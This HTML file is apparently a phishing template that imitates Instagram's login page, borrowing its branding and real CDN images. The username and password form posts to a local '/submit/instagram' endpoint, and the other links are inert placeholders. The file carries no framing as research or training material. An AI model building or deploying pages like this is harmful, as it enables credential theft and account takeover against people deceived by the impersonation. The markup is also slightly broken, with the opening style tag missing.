<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <link href="https://fonts.googleapis.com/css2?family=Lobster+Two:wght@400;700&display=swap" rel="stylesheet">

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px 0;
        }
        
        .main-container {
            display: flex;
            max-width: 935px;
            width: 100%;
            align-items: center;
            justify-content: center;
            gap: 32px;
            margin: 0 20px;
        }
        
        .phone-mockup {

            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAcYAAAJqCAYAAACj95h8AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6REY5NDBGM0JBMjdBMTFFN0EyRURBREFGRjJBNTYwRDgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6REY5NDBGM0NBMjdBMTFFN0EyRURBREFGRjJBNTYwRDgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpERjk0MEYzOUEyN0ExMUU3QTJFREFEQUZGMkE1NjBEOCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpERjk0MEYzQUEyN0ExMUU3QTJFREFEQUZGMkE1NjBEOCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv//Z');
            background-repeat: no-repeat;
            background-size: contain;
            height: 618px;
            position: relative;
        }
        
        .login-section {
            flex: 1;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .login-container {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            text-align: center;
        }
        
        .instagram-logo {
            font-family: "Lobster Two", cursive;
            font-size: 51px;
            color: #262626;
            margin: 0 auto 32px;
            font-weight: 400;
            letter-spacing: -2px;
            text-decoration: none;
            display: block;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        .input-field {
            width: 100%;
            padding: 9px 8px 7px;
            font-size: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            color: #262626;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            outline: none;
        }
        
        .input-field:focus {
            border-color: #a8a8a8;
            background: white;
        }
        
        .input-field::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        
        .login-btn {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            padding: 7px 16px;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s;
        }
        
        .login-btn:hover {
            background: #1877f2;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider span {
            padding: 0 18px;
        }
        
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 16px;
        }
        
        .facebook-login:hover {
            color: #365899;
        }
        
        .facebook-icon {
            width: 16px;
            height: 16px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE2IDhDMTYgMy41ODE3MiAxMi40MTgzIDAgOCAwQzMuNTgxNzIgMCAwIDMuNTgxNzIgMCA4QzAgMTEuOTkzNCAyLjkyNTQ0IDE1LjMwMjggNi43NSAxNS45MDJWMTAuMzEyNUg0LjcxODc1VjhINi43NVY2LjIzNzVDNi43NSA0LjMzMjUgNy45NDQzNCAzLjIwNjI1IDkuNzEyNSAzLjIwNjI1QzEwLjU2MjUgMy4yMDYyNSAxMS40NDM4IDMuMzYyNSAxMS40NDM4IDMuMzYyNVY1LjI1SDE0Ljc4MTJDOS4yNSA1LjI1IDkuMjUgNi4wNjI1IDkuMjUgNi44NzVWOEgxMS4zNzVMMTEuNjQwNiAxMC4zMTI1SDkuMjVWMTUuOTAyQzEzLjA3NDYgMTUuMzAyOCAxNiAxMS45OTM0IDE2IDhaIiBmaWxsPSIjMzg1MTg1Ii8+Cjwvc3ZnPgo=');
            background-size: contain;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
            display: inline-block;
        }
        
        .forgot-password:hover {
            color: #003c75;
        }
        
        .signup-container {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 25px 40px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        
        .signup-container a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .signup-container a:hover {
            color: #1877f2;
        }
        
        .get-app {
            text-align: center;
            margin-top: 20px;
        }
        
        .get-app p {
            font-size: 14px;
            color: #262626;
            margin-bottom: 20px;
        }
        
        .app-badges {
            display: flex;
            gap: 8px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .app-badge {
            height: 40px;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        
        .app-badge:hover {
            opacity: 0.8;
        }
        
        /* Mobile Responsive Design */
        @media (max-width: 875px) {
            .main-container {
                flex-direction: column;
                max-width: 350px;
                gap: 20px;
            }
            
            .phone-mockup {
                display: none;
            }
            
            .login-section {
                max-width: 100%;
                width: 100%;
            }
        }
        
        @media (max-width: 450px) {
            body {
                background: white;
                padding: 0;
            }
            
            .main-container {
                margin: 0;
                padding: 20px;
                max-width: 100%;
            }
            
            .login-container {
                border: none;
                background: white;
                padding: 20px;
                border-radius: 0;
            }
            
            .signup-container {
                border: none;
                background: white;
                padding: 20px;
                border-radius: 0;
            }
            
            .instagram-logo {
                font-size: 42px;
                margin-bottom: 24px;
            }
            
            .input-field {
                padding: 14px 16px;
                font-size: 16px; /* Prevent zoom on iOS */
                border-radius: 6px;
            }
            
            .login-btn {
                padding: 12px 16px;
                font-size: 16px;
                border-radius: 6px;
            }
            
            .app-badges {
                flex-direction: column;
                align-items: center;
            }
            
            .app-badge {
                width: 136px;
            }
        }
        
        @media (max-width: 320px) {
            .login-container,
            .signup-container {
                padding: 15px;
            }
            
            .instagram-logo {
                font-size: 36px;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Lobster+Two:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="main-container">
        <div class="phone-mockup"></div>
        
        <div class="login-section">
            <div class="login-container">
                <div class="instagram-logo">Instagram</div>
                
                <form action="/submit/instagram" method="post">
                    <div class="form-group">
                        <input type="text" name="username" class="input-field" placeholder="Phone number, username, or email" required>
                    </div>
                    
                    <div class="form-group">
                        <input type="password" name="password" class="input-field" placeholder="Password" required>
                    </div>
                    
                    <button type="submit" class="login-btn">Log in</button>
                </form>
                
                <div class="divider">
                    <span>or</span>
                </div>
                
                <a href="#" class="facebook-login">
                    <div class="facebook-icon"></div>
                    Log in with Facebook
                </a>
                
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            
            <div class="signup-container">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            
            <div class="get-app">
                <p>Get the app.</p>
                <div class="app-badges">
                    <a href="#" style="margin-right: 8px;">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" style="height: 40px;">
                    </a>
                    <a href="#">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Download on the App Store" style="height: 40px;">
                    </a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
